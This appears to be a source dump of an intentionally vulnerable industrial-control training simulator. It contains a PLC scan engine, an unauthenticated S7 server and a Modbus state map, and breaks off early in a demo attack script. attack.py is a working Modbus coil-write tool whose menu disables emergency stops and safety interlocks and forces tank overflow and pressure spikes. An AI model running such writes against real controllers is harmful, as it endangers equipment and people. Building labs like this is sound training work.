        log.info(f"[{self.plc_id}] PLC engine stopped")

    def _scan_cycle(self):
        """Main scan cycle (mimics real PLC operation)"""
        while self.running:
            cycle_start = time.time()

            try:
                # Check watchdog
                if time.time() - self.last_watchdog_reset > self.watchdog_timeout:
                    log.error(f"[{self.plc_id}] WATCHDOG TIMEOUT!")
                    self.set_state(PLCState.ERROR)
                    shared_state.update_state(f'{self.plc_id}_watchdog_fault', True)
                    time.sleep(1.0)
                    continue

                if self.state == PLCState.RUN:
                    # 1. Read inputs (from shared state)
                    self._read_inputs()

                    # 2. Execute program logic
                    self._execute_program()

                    # 3. Write outputs (to shared state)
                    self._write_outputs()

                    # 4. Update timers
                    self._update_timers(self.scan_time)

                    self.scan_count += 1

            except Exception as e:
                log.error(f"[{self.plc_id}] Scan cycle error: {e}")
                self.set_state(PLCState.ERROR)

            # Calculate scan time
            cycle_time = time.time() - cycle_start
            self.last_scan_time = cycle_time
            self.max_scan_time = max(self.max_scan_time, cycle_time)

            # Update diagnostics
            shared_state.update_state(f'{self.plc_id}_scan_time_ms', cycle_time * 1000)
            shared_state.update_state(f'{self.plc_id}_scan_count', self.scan_count)

            # Sleep to maintain scan rate
            sleep_time = max(0, self.scan_time - cycle_time)
            time.sleep(sleep_time)

    def _read_inputs(self):
        """Read inputs from shared state into input image"""
        # Example: Read pump status, sensor values, etc.
        state = shared_state.load_state()

        # Map shared state to input image
        for key, value in state.items():
            if key.startswith(f'{self.plc_id}_input_'):
                bit_addr = key.replace(f'{self.plc_id}_input_', '')
                self.input_image[bit_addr] = value

    def _write_outputs(self):
        """Write outputs from output image to shared state"""
        # Write output image to shared state
        for addr, value in self.output_image.items():
            shared_state.update_state(f'{self.plc_id}_output_{addr}', value)

    def _execute_program(self):
        """Execute ladder logic program"""
        self.accumulator = False

        for instruction in self.program:
            try:
                self._execute_instruction(instruction)
            except Exception as e:
                log.error(f"[{self.plc_id}] Instruction error: {instruction.type} - {e}")

    def _execute_instruction(self, instr: Instruction):
        """Execute a single instruction"""
        if instr.type == InstructionType.LD:
            # Load normally open contact
            addr = instr.operands[0]
            self.accumulator = self._get_bit(addr)

        elif instr.type == InstructionType.LDN:
            # Load normally closed contact
            addr = instr.operands[0]
            self.accumulator = not self._get_bit(addr)

        elif instr.type == InstructionType.AND:
            # AND with contact
            addr = instr.operands[0]
            self.accumulator = self.accumulator and self._get_bit(addr)

        elif instr.type == InstructionType.OR:
            # OR with contact
            addr = instr.operands[0]
            self.accumulator = self.accumulator or self._get_bit(addr)

        elif instr.type == InstructionType.OUT:
            # Output coil
            addr = instr.operands[0]
            self._set_bit(addr, self.accumulator)

        elif instr.type == InstructionType.TON:
            # Timer ON-delay
            timer_name = instr.operands[0]
            preset = float(instr.operands[1])

            if timer_name not in self.timers:
                self.timers[timer_name] = Timer(preset=preset)

            timer = self.timers[timer_name]

            if self.accumulator and not timer.running:
                timer.running = True
                timer.elapsed = 0.0
            elif not self.accumulator:
                timer.running = False
                timer.elapsed = 0.0
                timer.done = False

            timer.done = timer.elapsed >= timer.preset
            self.accumulator = timer.done

        elif instr.type == InstructionType.CMP:
            # Compare values
            op1 = self._get_value(instr.operands[0])
            operator = instr.operands[1]
            op2 = self._get_value(instr.operands[2])

            if operator == '>':
                self.accumulator = op1 > op2
            elif operator == '<':
                self.accumulator = op1 < op2
            elif operator == '==':
                self.accumulator = op1 == op2
            elif operator == '>=':
                self.accumulator = op1 >= op2
            elif operator == '<=':
                self.accumulator = op1 <= op2

    def _update_timers(self, delta_time: float):
        """Update all running timers"""
        for timer in self.timers.values():
            if timer.running:
                timer.elapsed += delta_time

    def _get_bit(self, addr: str) -> bool:
        """Get bit value from memory"""
        if addr.startswith('I'):
            return self.input_image.get(addr, False)
        elif addr.startswith('Q'):
            return self.output_image.get(addr, False)
        elif addr.startswith('M'):
            return self.memory_bits.get(addr, False)
        else:
            # Try shared state
            state_key = f'{self.plc_id}_{addr}'
            return shared_state.get_state(state_key, False)

    def _set_bit(self, addr: str, value: bool):
        """Set bit value in memory"""
        if addr.startswith('Q'):
            self.output_image[addr] = value
        elif addr.startswith('M'):
            self.memory_bits[addr] = value
        else:
            # Write to shared state
            state_key = f'{self.plc_id}_{addr}'
            shared_state.update_state(state_key, value)

    def _get_value(self, operand: str) -> float:
        """Get numeric value (from register or constant)"""
        if operand.isdigit() or operand.replace('.', '', 1).isdigit():
            return float(operand)
        else:
            # Get from shared state
            state_key = f'{self.plc_id}_{operand}'
            return shared_state.get_state(state_key, 0.0)

    def reset_watchdog(self):
        """Reset watchdog timer"""
        self.last_watchdog_reset = time.time()
        shared_state.update_state(f'{self.plc_id}_watchdog_fault', False)

    def get_diagnostics(self) -> Dict[str, Any]:
        """Get PLC diagnostics"""
        return {
            'state': self.state.value,
            'scan_count': self.scan_count,
            'last_scan_time_ms': self.last_scan_time * 1000,
            'max_scan_time_ms': self.max_scan_time * 1000,
            'program_size': len(self.program),
            'input_count': len(self.input_image),
            'output_count': len(self.output_image),
            'timer_count': len(self.timers),
            'counter_count': len(self.counters)
        }


# Example ladder logic programs

def create_tank_control_program() -> List[Instruction]:
    """
    Example: Tank level control with pump

    Network 1: Start pump if level < 30%
    Network 2: Stop pump if level > 80%
    Network 3: Emergency stop
    """
    return [
        # Network 1: Low level start
        Instruction(InstructionType.CMP, ['tank1_level', '<', '30'], "Check if level low"),
        Instruction(InstructionType.AND, ['M0.0'], "AND with run permissive"),
        Instruction(InstructionType.OUT, ['pump1_status'], "Start pump"),

        # Network 2: High level stop
        Instruction(InstructionType.CMP, ['tank1_level', '>', '80'], "Check if level high"),
        Instruction(InstructionType.OUT, ['M0.1'], "Set stop flag"),

        # Network 3: Apply stop flag
        Instruction(InstructionType.LD, ['pump1_status'], "Load pump status"),
        Instruction(InstructionType.AND, ['M0.1'], "AND with stop flag"),
        Instruction(InstructionType.OUT, ['pump1_status'], "Update pump"),

        # Network 4: Emergency stop
        Instruction(InstructionType.LD, ['emergency_stop'], "Load E-stop"),
        Instruction(InstructionType.OUT, ['pump1_status'], "Force pump off"),
    ]


if __name__ == '__main__':
    # Test PLC engine
    engine = PLCEngine('plc1', scan_time_ms=50)

    # Load example program
    program = create_tank_control_program()
    engine.load_program(program)

    # Start engine
    engine.start()

    try:
        while True:
            time.sleep(5)
            diag = engine.get_diagnostics()
            print(f"\n[PLC Diagnostics]")
            print(f"  State: {diag['state']}")
            print(f"  Scans: {diag['scan_count']}")
            print(f"  Scan Time: {diag['last_scan_time_ms']:.2f}ms (max: {diag['max_scan_time_ms']:.2f}ms)")

            engine.reset_watchdog()
    except KeyboardInterrupt:
        engine.stop()



================================================================================
FILE: core/s7_server.py
================================================================================
#!/usr/bin/env python3
"""
Basic Siemens S7 Protocol Server
Simplified implementation for educational purposes

S7comm protocol basics:
- Runs over ISO-on-TCP (port 102)
- Connection-oriented
- PDU-based communication
- Supports reading/writing data blocks, memory areas
"""

import socket
import threading
import struct
import logging
from enum import Enum
from typing import Dict, List, Tuple
import shared_state

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

class S7AreaCode(Enum):
    """S7 memory area codes"""
    SYSINFO = 0x03
    SYSFLAGS = 0x05
    ANAIN = 0x06
    ANAOUT = 0x07
    COUNTER = 0x1C
    TIMER = 0x1D
    IPI = 0x80
    IPQ = 0x81
    IPM = 0x82
    DB = 0x84  # Data Block

class S7Function(Enum):
    """S7 function codes"""
    READ_VAR = 0x04
    WRITE_VAR = 0x05
    DOWNLOAD = 0x1A
    UPLOAD = 0x1B
    PLC_CONTROL = 0x28
    PLC_STOP = 0x29

class S7Server:
    """
    Basic S7comm protocol server

    Implements simplified S7 protocol for:
    - Reading data blocks
    - Writing data blocks
    - PLC status queries
    - Basic PLC control

    INTENTIONALLY VULNERABLE for training:
    - No authentication
    - No encryption
    - Accepts all commands
    """

    def __init__(self, host='0.0.0.0', port=102, plc_id='plc1'):
        self.host = host
        self.port = port
        self.plc_id = plc_id
        self.running = False
        self.server_socket = None

        # S7 memory areas
        self.data_blocks: Dict[int, bytearray] = {}
        self.inputs = bytearray(1024)   # Input area (I)
        self.outputs = bytearray(1024)  # Output area (Q)
        self.markers = bytearray(1024)  # Memory area (M)

        # PLC state
        self.plc_mode = 'RUN'  # RUN, STOP, PROGRAM

        # Initialize data blocks
        for db_num in range(1, 11):
            self.data_blocks[db_num] = bytearray(1024)

        shared_state.init_state()

    def start(self):
        """Start S7 server"""
        if self.running:
            return

        self.running = True
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        try:
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)

            log.info(f"""
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘  Siemens S7 Protocol Server (Educational/Vulnerable)      â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

S7 Server: {self.host}:{self.port}
PLC ID: {self.plc_id}
Mode: {self.plc_mode}

VULNERABILITIES (Intentional):
  â€¢ No authentication required
  â€¢ No encryption
  â€¢ Accepts PLC STOP commands
  â€¢ No input validation
  â€¢ No access control

MEMORY AREAS:
  â€¢ Data Blocks: DB1-DB10 (1KB each)
  â€¢ Inputs (I): 1KB
  â€¢ Outputs (Q): 1KB
  â€¢ Markers (M): 1KB

TEST COMMANDS (using python snap7 library):
  import snap7
  plc = snap7.client.Client()
  plc.connect('{self.host}', 0, 1, {self.port})

  # Read DB1, starting at byte 0, 10 bytes
  data = plc.db_read(1, 0, 10)

  # Write to DB1
  plc.db_write(1, 0, bytearray([0x01, 0x02, 0x03]))

  # Get PLC status
  status = plc.get_cpu_state()

âš ï¸  WARNING: This is an INTENTIONALLY VULNERABLE implementation
    for security training purposes only!
            """)

            # Accept connections
            threading.Thread(target=self._accept_loop, daemon=True).start()

        except Exception as e:
            log.error(f"Failed to start S7 server: {e}")
            self.running = False

    def stop(self):
        """Stop S7 server"""
        self.running = False
        if self.server_socket:
            self.server_socket.close()
        log.info("[S7 Server] Stopped")

    def _accept_loop(self):
        """Accept client connections"""
        while self.running:
            try:
                client_socket, addr = self.server_socket.accept()
                log.info(f"[S7 Server] Client connected: {addr}")

                # Handle client in separate thread
                threading.Thread(
                    target=self._handle_client,
                    args=(client_socket, addr),
                    daemon=True
                ).start()

            except Exception as e:
                if self.running:
                    log.error(f"[S7 Server] Accept error: {e}")

    def _handle_client(self, client_socket: socket.socket, addr: Tuple):
        """Handle client connection"""
        try:
            while self.running:
                # Receive TPKT header (4 bytes)
                tpkt_header = client_socket.recv(4)
                if not tpkt_header or len(tpkt_header) < 4:
                    break

                # Parse TPKT
                version = tpkt_header[0]
                reserved = tpkt_header[1]
                length = struct.unpack('>H', tpkt_header[2:4])[0]

                # Receive remaining data
                data = client_socket.recv(length - 4)

                # Parse and handle S7 request
                response = self._handle_s7_request(data, addr)

                if response:
                    client_socket.send(response)

        except Exception as e:
            log.error(f"[S7 Server] Client error: {e}")
        finally:
            client_socket.close()
            log.info(f"[S7 Server] Client disconnected: {addr}")

    def _handle_s7_request(self, data: bytes, addr: Tuple) -> bytes:
        """
        Parse and handle S7 request

        Simplified S7 protocol handling:
        - Just enough to demonstrate concept
        - Real S7 protocol is much more complex
        """
        if len(data) < 10:
            return None

        try:
            # Parse COTP header (3 bytes minimum)
            cotp_length = data[0]
            cotp_pdu_type = data[1]

            # Check if connection request
            if cotp_pdu_type == 0xE0:
                # Connection Request - send Connection Confirm
                return self._build_connection_confirm()

            # Parse S7 header (starts after COTP)
            s7_start = cotp_length + 1
            if len(data) < s7_start + 10:
                return None

            s7_header = data[s7_start:]
            protocol_id = s7_header[0]
            msg_type = s7_header[1]
            reserved = struct.unpack('>H', s7_header[2:4])[0]
            pdu_ref = struct.unpack('>H', s7_header[4:6])[0]
            param_length = struct.unpack('>H', s7_header[6:8])[0]
            data_length = struct.unpack('>H', s7_header[8:10])[0]

            # Parse parameters
            if param_length > 0:
                params = s7_header[10:10+param_length]
                function = params[0]

                log.info(f"[S7 Server] Request from {addr}: function=0x{function:02X}")

                # Handle different functions
                if function == S7Function.READ_VAR.value:
                    return self._handle_read_var(pdu_ref, params, data)
                elif function == S7Function.WRITE_VAR.value:
                    return self._handle_write_var(pdu_ref, params, data)
                elif function == S7Function.PLC_CONTROL.value:
                    return self._handle_plc_control(pdu_ref, params)
                else:
                    log.warning(f"[S7 Server] Unsupported function: 0x{function:02X}")

        except Exception as e:
            log.error(f"[S7 Server] Request handling error: {e}")

        return None

    def _build_connection_confirm(self) -> bytes:
        """Build COTP Connection Confirm"""
        # TPKT Header
        tpkt = bytearray([
            0x03,  # Version
            0x00,  # Reserved
            0x00, 0x16  # Length (22 bytes)
        ])

        # COTP Connection Confirm
        cotp = bytearray([
            0x11,  # Length
            0xD0,  # PDU type (Connection Confirm)
            0x00, 0x01,  # Destination reference
            0x00, 0x00,  # Source reference
            0x00,  # Class/Option
        ])

        # S7 Communication Setup
        s7_setup = bytearray([
            0xC0, 0x01,  # Parameter code
            0x0A,  # Parameter length
            0xC1, 0x02, 0x01, 0x00,  # PDU size (256 bytes)
            0xC2, 0x02, 0x01, 0x00,  # PDU size
        ])

        return bytes(tpkt + cotp + s7_setup)

    def _handle_read_var(self, pdu_ref: int, params: bytes, data: bytes) -> bytes:
        """Handle read variable request"""
        # Simplified - return dummy data
        # Real implementation would parse area, DB number, offset, length

        # Build response
        response = bytearray()

        # TPKT Header
        response += bytearray([0x03, 0x00, 0x00, 0x1F])  # Length will be updated

        # COTP
        response += bytearray([0x02, 0xF0, 0x80])

        # S7 Header
        response += bytearray([
            0x32,  # Protocol ID
            0x03,  # Message type (Ack_Data)
            0x00, 0x00,  # Reserved
        ])
        response += struct.pack('>H', pdu_ref)  # PDU reference
        response += bytearray([0x00, 0x02])  # Param length
        response += bytearray([0x00, 0x08])  # Data length

        # Parameters
        response += bytearray([0x00, 0x00])  # Error class/code

        # Data
        response += bytearray([0xFF, 0x04, 0x00, 0x08])  # Return code, transport size, length
        response += bytearray([0x00, 0x01, 0x02, 0x03])  # Dummy data

        # Update length
        total_length = len(response)
        response[2:4] = struct.pack('>H', total_length)

        log.info(f"[S7 Server] Read variable response sent")
        return bytes(response)

    def _handle_write_var(self, pdu_ref: int, params: bytes, data: bytes) -> bytes:
        """Handle write variable request"""
        log.warning(f"[S7 Server] ðŸš¨ WRITE operation detected (no auth check!)")

        # Build success response
        response = bytearray()

        # TPKT Header
        response += bytearray([0x03, 0x00, 0x00, 0x16])

        # COTP
        response += bytearray([0x02, 0xF0, 0x80])

        # S7 Header
        response += bytearray([
            0x32,  # Protocol ID
            0x03,  # Message type (Ack_Data)
            0x00, 0x00,  # Reserved
        ])
        response += struct.pack('>H', pdu_ref)
        response += bytearray([0x00, 0x02])  # Param length
        response += bytearray([0x00, 0x01])  # Data length

        # Parameters (success)
        response += bytearray([0x00, 0x00])

        # Data (write result)
        response += bytearray([0xFF])  # Success

        return bytes(response)

    def _handle_plc_control(self, pdu_ref: int, params: bytes) -> bytes:
        """Handle PLC control command (START/STOP)"""
        # VULNERABILITY: No authentication for PLC control!
        if len(params) > 7:
            service = params[7]

            if service == 0x00:  # PLC STOP
                self.plc_mode = 'STOP'
                log.error("[S7 Server] ðŸš¨ðŸš¨ðŸš¨ PLC STOP command received (no auth!)")
                shared_state.update_state(f'{self.plc_id}_mode', 'STOP')
                shared_state.update_state(f'{self.plc_id}_emergency_stop', True)

            elif service == 0x01:  # PLC START
                self.plc_mode = 'RUN'
                log.info("[S7 Server] PLC START command received")
                shared_state.update_state(f'{self.plc_id}_mode', 'RUN')

        # Build response
        response = bytearray([0x03, 0x00, 0x00, 0x13])  # TPKT
        response += bytearray([0x02, 0xF0, 0x80])  # COTP
        response += bytearray([0x32, 0x03, 0x00, 0x00])  # S7 header
        response += struct.pack('>H', pdu_ref)
        response += bytearray([0x00, 0x00, 0x00, 0x00])  # No params/data

        return bytes(response)

    def read_db(self, db_num: int, offset: int, length: int) -> bytes:
        """Read from data block"""
        if db_num in self.data_blocks:
            return bytes(self.data_blocks[db_num][offset:offset+length])
        return bytes(length)

    def write_db(self, db_num: int, offset: int, data: bytes):
        """Write to data block"""
        if db_num not in self.data_blocks:
            self.data_blocks[db_num] = bytearray(1024)

        end = offset + len(data)
        if end <= len(self.data_blocks[db_num]):
            self.data_blocks[db_num][offset:end] = data
            log.info(f"[S7 Server] Wrote {len(data)} bytes to DB{db_num} @ offset {offset}")


if __name__ == '__main__':
    # Start S7 server
    server = S7Server(host='0.0.0.0', port=102, plc_id='plc1_s7')

    try:
        server.start()

        # Keep running
        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        print("\nStopping S7 server...")
        server.stop()



================================================================================
FILE: core/shared_state.py
================================================================================
#!/usr/bin/env python3
"""
Shared state manager for PLC simulator
Allows Modbus server and Flask app to share data
"""

import json
import os
import threading
import time
import fcntl  # For file locking across processes

STATE_FILE = '/app/shared/vulnplc_state.json'
LOCK = threading.Lock()

# Default state
DEFAULT_STATE = {
    'tank1_level': 50.0,
    'tank1_temp': 25.0,
    'tank1_pressure': 101.3,
    'tank2_level': 75.0,
    'tank2_temp': 30.0,
    'tank2_pressure': 95.5,
    'pump1_status': True,
    'pump1_speed': 1500,
    'pump2_status': False,
    'pump2_speed': 0,
    'pump3_status': True,
    'pump3_speed': 2000,
    'valve1_status': False,
    'valve2_status': True,
    'valve3_status': False,
    'valve4_status': False,
    'motor1_speed': 1500,
    'motor2_speed': 0,
    'heater1_status': False,
    'heater1_setpoint': 60.0,
    'cooler1_status': True,
    'cooler1_setpoint': 20.0,
    'conveyor_status': True,
    'conveyor_speed': 50,
    'emergency_stop': False,
    'safety_interlock': True,
    'flow_rate': 15.5,
    'vibration': 2.5,
    'ph_level': 7.0,
    'conductivity': 50.0,
    'alarms': [],
    'last_update': time.time()
}

def init_state():
    """
    Initialize state file with proper type validation (Task 4)
    Ensures ALL keys exist with correct data types
    """
    # Ensure the shared directory exists
    state_dir = os.path.dirname(STATE_FILE)
    if not os.path.exists(state_dir):
        os.makedirs(state_dir, exist_ok=True)

    # Load existing state or start with defaults
    if not os.path.exists(STATE_FILE):
        save_state(DEFAULT_STATE.copy())
        return DEFAULT_STATE.copy()

    # Validate and repair existing state
    state = load_state()
    needs_repair = False

    # Ensure all keys from DEFAULT_STATE exist
    for key, default_value in DEFAULT_STATE.items():
        if key not in state:
            state[key] = default_value
            needs_repair = True
            print(f"[STATE] Repaired missing key: {key}")
        # Type validation
        elif key != 'alarms' and key != 'last_update':  # Skip special keys
            expected_type = type(default_value)
            if not isinstance(state[key], expected_type):
                # Try to convert, or reset to default
                try:
                    if expected_type == bool:
                        state[key] = bool(state[key])
                    elif expected_type == int:
                        state[key] = int(state[key])
                    elif expected_type == float:
                        state[key] = float(state[key])
                    print(f"[STATE] Converted {key} to {expected_type.__name__}")
                except (ValueError, TypeError):
                    state[key] = default_value
                    needs_repair = True
                    print(f"[STATE] Repaired invalid type for {key}: {type(state[key])} -> {expected_type}")

    # Ensure alarms is always a list
    if not isinstance(state.get('alarms'), list):
        state['alarms'] = []
        needs_repair = True

    if needs_repair:
        save_state(state)

    return state

def load_state():
    """Load state from file with proper file locking"""
    try:
        with LOCK:
            if os.path.exists(STATE_FILE):
                with open(STATE_FILE, 'r') as f:
                    # Acquire shared lock for reading
                    fcntl.flock(f.fileno(), fcntl.LOCK_SH)
                    try:
                        data = json.load(f)
                        return data
                    finally:
                        fcntl.flock(f.fileno(), fcntl.LOCK_UN)
            else:
                return DEFAULT_STATE.copy()
    except json.JSONDecodeError as e:
        print(f"Error loading state (JSON corrupt): {e}")
        print("Reinitializing with default state...")
        save_state(DEFAULT_STATE.copy())
        return DEFAULT_STATE.copy()
    except Exception as e:
        print(f"Error loading state: {e}")
        return DEFAULT_STATE.copy()

def save_state(state):
    """Save state to file with atomic write (prevents corruption)"""
    try:
        with LOCK:
            state['last_update'] = time.time()
            # Write to temp file first, then atomic rename
            temp_file = STATE_FILE + f'.tmp.{os.getpid()}'
            with open(temp_file, 'w') as f:
                json.dump(state, f, indent=2)
                f.flush()
                os.fsync(f.fileno())
            # Atomic rename (replaces old file instantly)
            os.replace(temp_file, STATE_FILE)
    except Exception as e:
        print(f"Error saving state: {e}")
        # Clean up temp file if it exists
        temp_file = STATE_FILE + f'.tmp.{os.getpid()}'
        if os.path.exists(temp_file):
            try:
                os.remove(temp_file)
            except:
                pass

def update_state(key, value):
    """Update a single state value"""
    state = load_state()
    state[key] = value
    save_state(state)

def get_state(key, default=None):
    """Get a single state value"""
    state = load_state()
    return state.get(key, default)

# Modbus register mapping
# Each register maps to a specific state variable
REGISTER_MAP = {
    # Holding Registers (Read/Write) - Function Code 3/6/16
    0: ('tank1_level', 'float', 10),      # Scaled by 10 (500 = 50.0%)
    1: ('tank1_temp', 'float', 10),       # Scaled by 10 (250 = 25.0Â°C)
    2: ('tank1_pressure', 'float', 10),   # Scaled by 10 (1013 = 101.3 kPa)
    3: ('tank2_level', 'float', 10),
    4: ('tank2_temp', 'float', 10),
    5: ('tank2_pressure', 'float', 10),
    6: ('pump1_speed', 'int', 1),
    7: ('pump2_speed', 'int', 1),
    8: ('pump3_speed', 'int', 1),
    9: ('motor1_speed', 'int', 1),
    10: ('motor2_speed', 'int', 1),
    11: ('conveyor_speed', 'int', 1),
    12: ('heater1_setpoint', 'float', 10),
    13: ('cooler1_setpoint', 'float', 10),
    14: ('flow_rate', 'float', 10),
    15: ('vibration', 'float', 10),
    16: ('ph_level', 'float', 10),
    17: ('conductivity', 'float', 10),
}

# Coils (Read/Write Boolean) - Function Code 1/5/15
COIL_MAP = {
    0: 'pump1_status',
    1: 'pump2_status',
    2: 'pump3_status',
    3: 'valve1_status',
    4: 'valve2_status',
    5: 'valve3_status',
    6: 'valve4_status',
    7: 'heater1_status',
    8: 'cooler1_status',
    9: 'conveyor_status',
    10: 'emergency_stop',
    11: 'safety_interlock',
}

def register_to_state(register, value):
    """Convert Modbus register value to state value"""
    if register in REGISTER_MAP:
        key, value_type, scale = REGISTER_MAP[register]
        if value_type == 'float':
            return key, float(value) / scale
        else:
            return key, int(value)
    return None, None

def state_to_register(register):
    """Convert state value to Modbus register value"""
    if register in REGISTER_MAP:
        key, value_type, scale = REGISTER_MAP[register]
        value = get_state(key, 0)
        if value_type == 'float':
            return int(value * scale)
        else:
            return int(value)
    return 0

def coil_to_state(coil, value):
    """Convert Modbus coil value to state"""
    if coil in COIL_MAP:
        key = COIL_MAP[coil]
        return key, bool(value)
    return None, None

def state_to_coil(coil):
    """Convert state value to Modbus coil value"""
    if coil in COIL_MAP:
        key = COIL_MAP[coil]
        value = get_state(key, False)
        return 1 if value else 0
    return 0

# ==============================================================================
# UNIFIED COIL/REGISTER ACCESS HELPERS (Task 2 - State Consistency)
# ==============================================================================
# These functions provide a single source of truth for coil/register access.
# All Modbus handlers, HMI, and web interfaces MUST use these helpers to ensure
# synchronized state across the entire system.
# ==============================================================================

def get_coil(addr):
    """
    Get coil value - ALWAYS returns 0 or 1
    Used by: Modbus servers, HMI, web interface
    """
    value = state_to_coil(addr)
    # Ensure coil is always 0 or 1
    return 1 if value else 0

def set_coil(addr, value):
    """
    Set coil value - accepts any truthy/falsy value, stores as bool
    Used by: Modbus servers, HMI, web interface
    """
    # Convert to state key and boolean value
    key, bool_value = coil_to_state(addr, value)
    if key:
        update_state(key, bool(bool_value))
    else:
        print(f"[WARN] Attempted to set unmapped coil {addr}")

def get_register(addr):
    """
    Get register value - ALWAYS returns 0-65535
    Used by: Modbus servers, HMI, web interface
    """
    value = state_to_register(addr)
    # Clamp to valid Modbus register range
    return max(0, min(65535, int(value)))

def set_register(addr, value):
    """
    Set register value - converts Modbus register value to state value
    Used by: Modbus servers, HMI, web interface
    """
    # Convert to state key and scaled value
    key, converted_value = register_to_state(addr, value)
    if key:
        # Ensure numeric type
        if isinstance(converted_value, (int, float)):
            update_state(key, converted_value)
        else:
            print(f"[WARN] Invalid register value type for {key}: {type(converted_value)}")
    else:
        print(f"[WARN] Attempted to set unmapped register {addr}")

if __name__ == '__main__':
    # Test the shared state
    print("Initializing shared state...")
    state = init_state()
    print(f"Current state: {json.dumps(state, indent=2)}")

    print("\nTesting update...")
    update_state('tank1_level', 75.5)
    print(f"Tank 1 level: {get_state('tank1_level')}")

    print("\nRegister mapping test:")
    print(f"Register 0 (tank1_level): {state_to_register(0)}")
    print(f"Coil 0 (pump1_status): {state_to_coil(0)}")



================================================================================
FILE: attack.py
================================================================================
#!/usr/bin/env python3
"""
Simple attack script - no modbus-cli needed!
Usage: python3 attack.py
"""
import socket
import struct
import sys

def modbus_write_coil(host, port, coil, value):
    """Write a single coil via Modbus TCP"""
    try:
        sock = socket.socket()
        sock.settimeout(3)
        sock.connect((host, port))

        # Build Modbus request
        transaction_id = 1
        protocol_id = 0
        length = 6
        unit_id = 1
        function_code = 0x05  # Write Single Coil
        coil_address = coil
        coil_value = 0xFF00 if value else 0x0000

        # MBAP Header + PDU
        request = struct.pack('>HHHB', transaction_id, protocol_id, length, unit_id)
        request += struct.pack('>BHH', function_code, coil_address, coil_value)

        sock.send(request)
        response = sock.recv(1024)
        sock.close()

        # Check response
        if len(response) >= 12 and response[7] == 0x05:
            return True, "Success"
        else:
            return False, f"Unexpected response: {response.hex()}"

    except Exception as e:
        return False, str(e)

def print_menu():
    print("""
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘  Vuln-PLC Attack Tool                                        â•‘
â•‘  Watch the visual alerts in the web UI!                     â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Choose an attack:

1. Tank Overflow (PLC-1)
   - Turn pump ON
   - Close drain valve
   - Watch tank level rise!

2. Pressure Spike (PLC-2)
   - Turn compressor ON
   - Close relief valve
   - Watch pressure increase!

3. Safety System Bypass (PLC-4) ðŸš¨ CRITICAL
   - Disable emergency stop
   - Disable safety interlock
   - Watch RED PULSING ALERT!

4. Custom attack
5. Exit

Open web UI first: http://localhost:5000/process (admin/admin)
""")

if __name__ == '__main__':
    while True:
        print_menu()
        choice = input("Enter choice (1-5): ").strip()

        if choice == '1':
            print("\n[Attack 1] Tank Overflow Attack")
            print("  Step 1: Turning pump ON...")
            success, msg = modbus_write_coil('127.0.0.1', 5502, 0, True)
            print(f"    {'âœ“' if success else 'âœ—'} {msg}")

            print("  Step 2: Closing drain valve...")
            success, msg = modbus_write_coil('127.0.0.1', 5502, 3, False)
            print(f"    {'âœ“' if success else 'âœ—'} {msg}")

            print("\n  âš ï¸  Check web UI - you should see WARNING alerts!")
            input("\nPress Enter to continue...")

        elif choice == '2':
            print("\n[Attack 2] Pressure Spike Attack")
            print("  Step 1: Turning compressor ON...")
            success, msg = modbus_write_coil('127.0.0.1', 5503, 0, True)
            print(f"    {'âœ“' if success else 'âœ—'} {msg}")

            print("  Step 2: Closing relief valve...")
            success, msg = modbus_write_coil('127.0.0.1', 5503, 4, False)
            print(f"    {'âœ“' if success else 'âœ—'} {msg}")

            print("\n  âš ï¸  Check web UI - you should see WARNING alerts!")
            input("\nPress Enter to continue...")

        elif choice == '3':
            print("\n[Attack 3] Safety System Bypass - ðŸš¨ CRITICAL ðŸš¨")
            print("  Step 1: Disabling emergency stop...")
            success, msg = modbus_write_coil('127.0.0.1', 5505, 0, False)
            print(f"    {'âœ“' if success else 'âœ—'} {msg}")

            print("  Step 2: Disabling safety interlock...")
            success, msg = modbus_write_coil('127.0.0.1', 5505, 1, False)
            print(f"    {'âœ“' if success else 'âœ—'} {msg}")

            print("\n  ðŸš¨ Check web UI - RED PULSING CRITICAL ALERT should appear!")
            input("\nPress Enter to continue...")

        elif choice == '4':
            print("\n[Custom Attack]")
            try:
                host = input("  Host (default: 127.0.0.1): ").strip() or '127.0.0.1'
                port = int(input("  Port (5502-5505): ").strip())
                coil = int(input("  Coil address (0-10): ").strip())
                value_str = input("  Value (ON/OFF): ").strip().upper()
                value = value_str in ['ON', '1', 'TRUE']

                print(f"\n  Executing attack on {host}:{port} coil {coil} = {value}...")
                success, msg = modbus_write_coil(host, port, coil, value)
                print(f"    {'âœ“' if success else 'âœ—'} {msg}")

                print("\n  Check web UI for alerts!")
                input("\nPress Enter to continue...")

            except ValueError as e:
                print(f"  âœ— Invalid input: {e}")
                input("\nPress Enter to continue...")

        elif choice == '5':
            print("\nExiting...")
            break

        else:
            print("\nâœ— Invalid choice. Please enter 1-5.")
            input("\nPress Enter to continue...")



================================================================================
FILE: demo_attack.py
================================================================================
#!/usr/bin/env python3
"""
Demo script to show Modbus attacks and their effects on the web UI
"""
import socket
import struct
import requests
import json
import time

def read_state():
    """Read current state from shared state file"""
    try:
        with open('/tmp/plc_state.json', 'r') as f:
            return json.load(f)
    except:
        return {}

def modbus_write_coil(host, port, coil, value):
    """Write a single coil via Modbus"""
    sock = socket.socket()
    sock.settimeout(5)
    sock.connect((host, port))

    # MBAP Header + Write Single Coil
